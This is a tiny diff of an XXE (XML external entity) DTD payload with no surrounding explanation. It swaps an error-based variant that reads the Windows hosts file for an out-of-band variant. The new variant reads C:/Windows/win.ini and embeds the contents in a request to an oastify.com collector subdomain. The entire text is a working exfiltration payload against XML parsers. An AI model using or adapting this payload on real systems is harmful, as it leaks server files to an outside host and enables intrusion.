@@ -1,4 +1,3 @@
-<!ENTITY % file SYSTEM "file:///c:/Windows/System32/drivers/etc/hosts">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
-%eval;
-%exfil;
+<!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://lpetmtsl634gals27w5os6tgw72yq0ep.oastify.com/?%file;'>">
+%all;
